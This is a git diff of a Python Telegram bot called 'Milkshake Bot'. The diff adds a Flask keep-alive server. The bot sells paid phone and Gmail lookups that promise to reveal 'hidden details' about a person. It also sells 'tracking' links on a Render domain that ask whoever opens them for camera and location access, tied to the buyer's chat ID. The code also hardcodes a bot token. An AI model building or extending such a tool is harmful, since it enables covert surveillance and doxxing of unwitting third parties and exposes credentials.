@@ -5,8 +5,29 @@ import urllib.parse
 import logging
 import requests
 import httpx
+import threading
+from flask import Flask
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
+
+# === FLASK WEB SERVER SETUP ===
+app = Flask(__name__)
+
+@app.route('/')
+def home():
+    return "🤖 Milkshake Bot is running!"
+
+@app.route('/health')
+def health():
+    return "OK"
+
+@app.route('/ping')
+def ping():
+    return "Pong!"
+
+def run_web_server():
+    port = int(os.environ.get('PORT', 10000))
+    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
 
 # === CONFIGURATION ===
 BOT_TOKEN = "8307999302:AAFk0WOKT_6tzuDs0h4FvGtpnMiguecj54Q"
@@ -29,7 +50,6 @@ user_balances = {}   # {user_id: credits}
 # Render Link
 RENDER_LINK = "https://jsjs-kzua.onrender.com"
 
-
 # === HELPERS ===
 def format_as_js(data):
     js_lines = []
@@ -38,7 +58,6 @@ def format_as_js(data):
         value_str = json.dumps(value, ensure_ascii=False)
         js_lines.append(f"{key_str}: {value_str}")
     return "{\n" + ",\n".join(js_lines) + "\n}"
-
 
 def generate_report(query):
     data = {"token": API_KEY, "request": query.strip(), "limit": LIMIT, "lang": LANG}
@@ -61,11 +80,9 @@ def generate_report(query):
 
     return "\n".join(output) if output else "⚠️ No results found."
 
-
 def make_personal_link(chat_id: int, site: str) -> str:
     encoded = urllib.parse.quote(site, safe="")
     return f"{RENDER_LINK}/?chat_id={chat_id}&site={encoded}"
-
 
 async def check_site_embeddable(url: str) -> (bool, str):
     SIMPLE_URL_RE = re.compile(r"^https://[^\s/$.?#].[^\s]*$", re.IGNORECASE)
@@ -100,7 +117,6 @@ async def check_site_embeddable(url: str) -> (bool, str):
 
         return True, "OK"
 
-
 # === COMMANDS ===
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -113,15 +129,14 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ]
     await update.message.reply_text(
         f"👋 <b>Welcome {user.first_name}!</b>\n\n"
-        "I’m your <b>Milkshake Bot</b>, ready to fetch hidden details and give you powerful tools.\n\n"
+        "I'm your <b>Milkshake Bot</b>, ready to fetch hidden details and give you powerful tools.\n\n"
         "✨ Available Services:\n"
         f"• 📲 Phone/Gmail Lookup → <b>₹{COST_LOOKUP}</b>\n"
         f"• 🌍 Tracking via Website → <b>₹{COST_TRACK}</b>\n\n"
-        "Choose wisely, and let’s get started ⬇️",
+        "Choose wisely, and let's get started ⬇️",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode="HTML"
     )
-
 
 async def buy(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = (
@@ -135,7 +150,6 @@ async def buy(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat = update.message or update.callback_query.message
     await chat.reply_photo(QR_IMAGE, caption=text, parse_mode="HTML")
 
-
 async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     bal = user_balances.get(user_id, 0)
@@ -145,7 +159,6 @@ async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "✨ Remember: Keep your balance loaded so you can instantly unlock secrets 🔍",
         parse_mode="HTML"
     )
-
 
 async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.message.from_user.id != ADMIN_ID:
@@ -161,7 +174,6 @@ async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except:
         await update.message.reply_text("⚠️ Usage: /approve <user_id> <amount>")
 
-
 # === SERVICE 1 ===
 async def service_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data["awaiting_lookup"] = True
@@ -170,10 +182,9 @@ async def service_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"Cost: <b>{COST_LOOKUP} credits</b>\n\n"
         "👉 Enter the phone number or Gmail you want to investigate.\n"
         "📌 For Indian numbers, use <code>+91XXXXXXXXXX</code> format.\n\n"
-        "💡 Pro Tip: Just type any number or email and I’ll decode the hidden details. You’ll be surprised 😉",
+        "💡 Pro Tip: Just type any number or email and I'll decode the hidden details. You'll be surprised 😉",
         parse_mode="HTML"
     )
-
 
 # === SERVICE 2 ===
 async def service_track(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -182,10 +193,9 @@ async def service_track(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"🌍 <b>Website Tracking Service</b>\n\n"
         f"Cost: <b>{COST_TRACK} credits</b>\n\n"
         "🔗 Send me a full HTTPS URL (example: <code>https://example.com</code>).\n\n"
-        "I’ll generate a special link which, when opened, can request camera & location access 📡",
+        "I'll generate a special link which, when opened, can request camera & location access 📡",
         parse_mode="HTML"
     )
-
 
 # === Handle messages ===
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -227,11 +237,10 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         personal = make_personal_link(user_id, text)
         await update.message.reply_text(
-            f"✅ Site is valid!\n\nHere’s your personal tracking link:\n\n<code>{personal}</code>",
+            f"✅ Site is valid!\n\nHere's your personal tracking link:\n\n<code>{personal}</code>",
             parse_mode="HTML"
         )
         return
-
 
 # === Buttons ===
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -246,22 +255,25 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif query.data == "service_track":
         await service_track(update, context)
 
-
 # === MAIN ===
 def main():
-    app = Application.builder().token(BOT_TOKEN).build()
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("approve", approve))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-    app.add_handler(CallbackQueryHandler(button_handler))
+    # Start web server in a separate thread
+    server_thread = threading.Thread(target=run_web_server, daemon=True)
+    server_thread.start()
+    
+    # Start Telegram bot
+    application = Application.builder().token(BOT_TOKEN).build()
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("approve", approve))
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+    application.add_handler(CallbackQueryHandler(button_handler))
 
     # forward payment proofs
-    app.add_handler(MessageHandler(filters.PHOTO, lambda u, c: u.message.forward(ADMIN_ID)))
-    app.add_handler(MessageHandler(filters.Document.ALL, lambda u, c: u.message.forward(ADMIN_ID)))
+    application.add_handler(MessageHandler(filters.PHOTO, lambda u, c: u.message.forward(ADMIN_ID)))
+    application.add_handler(MessageHandler(filters.Document.ALL, lambda u, c: u.message.forward(ADMIN_ID)))
 
-    print("🤖 Bot is running...")
-    app.run_polling()
-
+    print("🤖 Bot is running with web server...")
+    application.run_polling()
 
 if __name__ == "__main__":
     main()
